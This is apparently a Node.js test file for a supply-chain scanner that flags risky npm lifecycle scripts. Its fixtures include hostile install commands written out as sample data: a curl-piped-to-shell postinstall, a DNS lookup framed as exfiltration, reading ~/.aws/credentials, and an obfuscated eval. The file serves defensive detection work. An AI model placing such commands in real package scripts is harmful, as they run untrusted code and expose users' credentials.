import { test } from "node:test";
import assert from "node:assert/strict";
import { checkLifecycle, lifecycleRiskLevel } from "../src/analyzer/lifecycle.js";

function meta(scripts) { return { versions: { "1.0.0": { scripts } } }; }

test("lifecycle:pipe-to-shell catches curl|sh", () => {
  const f = checkLifecycle(meta({ postinstall: "curl -s https://x.example.com | sh" }), "1.0.0");
  assert.ok(f.some((x) => x.kind.startsWith("lifecycle:pipe-to-shell")));
});

test("lifecycle:dns-exfil catches dns.lookup", () => {
  const f = checkLifecycle(meta({ install: "node -e 'require(\"dns\").lookup(\"x.com\")'" }), "1.0.0");
  assert.ok(f.some((x) => x.kind.includes("dns-exfil") || x.kind.includes("net-require")));
});

test("lifecycle:dotfile-access catches .aws/credentials", () => {
  const f = checkLifecycle(meta({ postinstall: "cat ~/.aws/credentials" }), "1.0.0");
  assert.ok(f.some((x) => x.kind.includes("dotfile-access")));
});

test("lifecycle:obfuscation catches \\x escapes", () => {
  const f = checkLifecycle(meta({ install: "node -e 'eval(\"\\\\x65\\\\x76\")'" }), "1.0.0");
  assert.ok(f.some((x) => x.kind.includes("obfuscation") || x.kind.includes("eval")));
});

test("lifecycle:node-gyp scored low", () => {
  const f = checkLifecycle(meta({ install: "node-gyp rebuild" }), "1.0.0");
  const ng = f.find((x) => x.kind.includes("node-gyp"));
  assert.ok(ng);
  assert.equal(ng.severity, "low");
});

test("riskLevel mapping", () => {
  assert.equal(lifecycleRiskLevel(0), "clean");
  assert.equal(lifecycleRiskLevel(10), "low");
  assert.equal(lifecycleRiskLevel(35), "suspicious");
  assert.equal(lifecycleRiskLevel(70), "critical");
});
